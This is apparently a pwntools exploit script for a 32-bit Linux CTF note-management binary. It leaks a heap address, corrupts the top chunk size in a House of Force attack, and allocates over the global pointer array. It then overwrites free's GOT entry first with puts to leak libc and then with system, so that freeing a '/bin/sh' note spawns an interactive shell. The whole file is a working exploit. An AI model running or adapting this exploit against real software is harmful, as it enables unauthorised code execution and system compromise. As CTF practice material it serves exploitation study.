from parse_args_and_some_func import *

context.update(arch='i386', os='linux')

sh = all_parsed_args['io']

assert isinstance(sh, tube)

def new_note(size, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter("Input the length of the note content:\n", str(size))
    io.sendlineafter("Input the content:\n", content)
    io.recvline()

def edit_note(idx, content, io:tube=sh):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter("Input the id:\n", str(idx))
    io.sendlineafter("Input the new content:\n", content)
    io.recvline()


def del_note(idx, io:tube=sh):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter("Input the id:\n", str(idx))

sh.sendafter("Input your name:\n", 'a' * 0x40)
sh.recvuntil('a' * 0x40)

leak_heap_addr = u32(sh.recvn(4))
LOG_ADDR('leak_heap_addr', leak_heap_addr)
STOP()
sh.sendafter("Org:\n", 'a' * 0x40)

sh.sendafter("Host:\n", p32(0xffffffff) + (0x40 - 4) * b'a')
sh.recvuntil("OKay! Enjoy:)\n")
STOP()
top_chunk_addr = leak_heap_addr + 0xd0

ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr

new_note(margin - 20, "") # 0
STOP()
free_got = 0x804b014
puts_plt = 0x8048520
printf_got = 0x804b010

for _ in range(4):
    new_note(0x40, 'aa')

edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))

edit_note(2, p32(puts_plt))

del_note(3)

msg = sh.recvuntil("Delete success.\n")

printf_addr = u32(msg[:4])
LOG_ADDR('printf_addr', printf_addr)
STOP()
if all_parsed_args['debug_enable']:
    offset =  0xe8d0 # 0x10470
else:
    libc = LibcSearcher('printf', printf_addr)
    libc_base = printf_addr - libc.dump('printf')
    LOG_ADDR('libc_base', libc_base)
    offset = libc.dump('printf') - libc.dump('system')
    LOG_ADDR('offset', offset)

system_addr = printf_addr - offset

edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

edit_note(2, p32(system_addr))
STOP()
del_note(0)

sh.interactive()